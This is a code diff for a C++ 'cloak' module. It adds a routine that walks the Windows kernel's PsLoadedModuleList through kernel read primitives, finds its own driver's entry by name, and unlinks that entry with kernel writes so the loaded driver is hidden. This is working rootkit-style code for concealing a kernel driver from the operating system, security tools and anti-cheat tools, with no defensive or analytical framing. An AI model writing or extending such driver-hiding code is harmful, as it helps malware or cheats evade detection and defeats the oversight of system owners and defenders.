@@ -4,14 +4,15 @@
 #include <cstring>
 #include <cstdlib>
 #include <string>
+#include <vector>
 
 namespace cloak {
 
 namespace {
 
-uint64_t g_head{};
-uint64_t g_our_base{};
-bool     g_on{};
+uint64_t g_head{};      // PsLoadedModuleList head VA
+uint64_t g_our_base{};  // Our driver's DllBase
+bool     g_on{};        // cloak active state
 
 std::string g_driver_name;
 
@@ -29,8 +30,7 @@ bool valid_head(uint64_t h) {
     uint64_t flink{}, blink{};
     if (!vmm::kread_trusted(h, &flink, 8)) return false;
     if (!vmm::kread_trusted(h + 8, &blink, 8)) return false;
-    if (flink < 0xFFFF800000000000ull || blink < 0xFFFF800000000000ull)
-        return false;
+    if (flink < 0xFFFF800000000000ull || blink < 0xFFFF800000000000ull) return false;
     return true;
 }
 
@@ -67,6 +67,52 @@ bool find_head(uint64_t& head) {
     return false;
 }
 
+bool find_our_driver() {
+    if (!g_head) {
+        if (!find_head(g_head)) return false;
+    }
+    const char* want = driver_image();
+    if (!want || !*want) return false;
+
+    wchar_t our_w[128]{};
+    size_t len = strlen(want);
+    for (size_t i = 0; i < len && i < 127; ++i) our_w[i] = static_cast<wchar_t>(want[i]);
+
+    uint64_t flink{};
+    if (!vmm::kread_trusted(g_head, &flink, 8)) return false;
+    uint64_t cur = flink;
+    while (cur != g_head && cur != 0) {
+        uint64_t dll_base{};
+        if (!vmm::kread_trusted(cur + 0x30, &dll_base, 8)) break;
+        uint64_t cur_flink{};
+        if (!vmm::kread_trusted(cur, &cur_flink, 8)) break;
+        uint64_t name_buf{};
+        if (!vmm::kread_trusted(cur + 0x58, &name_buf, 8)) break;
+        if (!name_buf || name_buf < 0xFFFF800000000000ull) break;
+        wchar_t wname[128]{};
+        if (!vmm::kread_trusted(name_buf, wname, sizeof(wname) - 2)) break;
+        size_t blen = 0;
+        while (blen < 127 && wname[blen]) blen++;
+        size_t start = blen;
+        while (start > 0 && wname[start - 1] != L'\\' && wname[start - 1] != L'/') --start;
+        bool match = true;
+        size_t j = 0;
+        for (size_t i = start; i < blen && our_w[i]; ++i, ++j) {
+            wchar_t c1 = wname[i];
+            wchar_t c2 = our_w[i];
+            if (c1 >= L'A' && c1 <= L'Z') c1 = static_cast<wchar_t>(c1 + 32);
+            if (c2 >= L'A' && c2 <= L'Z') c2 = static_cast<wchar_t>(c2 + 32);
+            if (c1 != c2) { match = false; break; }
+        }
+        if (match && our_w[j] == 0) {
+            g_our_base = dll_base;
+            return true;
+        }
+        cur = cur_flink;
+    }
+    return false;
+}
+
 } // namespace
 
 bool apply(bool commit) {
@@ -75,13 +121,10 @@ bool apply(bool commit) {
         if (!find_head(g_head)) return false;
     }
     if (g_our_base == 0) {
-        uint64_t our_size = 0;
-        if (!vmm::module_base(driver_image(), g_our_base, our_size)) {
-            printf("[!] our driver's DllBase not found via SystemModuleInformation\n");
+        if (!find_our_driver()) {
+            printf("[!] our driver's KLDR_DATA_TABLE_ENTRY not found\n");
             return false;
         }
-        printf("[*] our DllBase = 0x%llx  size = 0x%llx\n",
-               (unsigned long long)g_our_base, (unsigned long long)our_size);
     }
     uint64_t flink{};
     if (!vmm::kread_trusted(g_head, &flink, 8)) return false;
@@ -102,6 +145,7 @@ bool apply(bool commit) {
             if (!vmm::kwrite_trusted(cur_blink, &cur_flink, 8)) return false;
             if (!vmm::kwrite_trusted(cur_flink + 8, &cur_blink, 8)) return false;
             g_on = false;
+            printf("[+] driver unlinked from PsLoadedModuleList\n");
             return true;
         }
         cur = cur_flink;
